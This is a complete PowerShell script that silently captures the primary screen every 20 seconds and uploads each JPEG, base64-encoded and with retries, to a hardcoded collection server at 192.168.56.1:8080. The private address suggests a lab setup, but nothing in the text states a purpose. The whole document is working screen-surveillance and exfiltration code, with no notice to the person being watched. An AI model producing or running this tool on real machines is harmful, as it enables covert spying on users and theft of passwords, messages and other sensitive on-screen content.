# Add required assemblies
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Configuration
$serverUrl = "http://192.168.56.1:8080/upload"
$interval = 20  # Screenshot interval in seconds
$maxMemoryStreamSize = 10MB  # Limit memory usage
$maxRetries = 3  # Number of retries for failed uploads

while ($true) {
    try {
        # Create objects in a smaller scope
        $bitmap = $null
        $graphics = $null
        $memStream = $null
        
        try {
            $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
            $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
            $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)

            $memStream = New-Object System.IO.MemoryStream
            $bitmap.Save($memStream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
            
            if ($memStream.Length -le $maxMemoryStreamSize) {
                $imageBytes = $memStream.ToArray()
                # Convert to Base64 properly
                $base64Image = [Convert]::ToBase64String($imageBytes)

                # Send to server
                $boundary = [System.Guid]::NewGuid().ToString()
                $LF = "`r`n"
                $bodyLines = (
                    "--$boundary",
                    "Content-Disposition: form-data; name=`"screenshot`"; filename=`"screenshot.jpg`"",
                    "Content-Type: image/jpeg",
                    "",
                    $base64Image,
                    "--$boundary--"
                ) -join $LF
                
                # Send to server with retry logic
                $retryCount = 0
                $success = $false
                
                while (-not $success -and $retryCount -lt $maxRetries) {
                    try {
                        $result = Invoke-RestMethod -Uri $serverUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines -TimeoutSec 30
                        $success = $true
                    }
                    catch {
                        $retryCount++
                        if ($retryCount -lt $maxRetries) {
                            Start-Sleep -Seconds 5
                        }
                        else {
                            Write-Error "Failed to upload screenshot after $maxRetries attempts."
                        }
                    }
                }
            }
        }
        finally {
            # Ensure immediate cleanup of all resources
            if ($graphics) { $graphics.Dispose() }
            if ($bitmap) { $bitmap.Dispose() }
            if ($memStream) { $memStream.Dispose() }
            
            # Clear variables
            $imageBytes = $null
            $body = $null
            $bodyLines = $null
            
            # Force immediate garbage collection
            [System.GC]::Collect()
            [System.GC]::WaitForPendingFinalizers()
        }

        Start-Sleep -Seconds $interval
    }
    catch {
        Write-Error $_.Exception.Message
        Start-Sleep -Seconds 15
    }
}
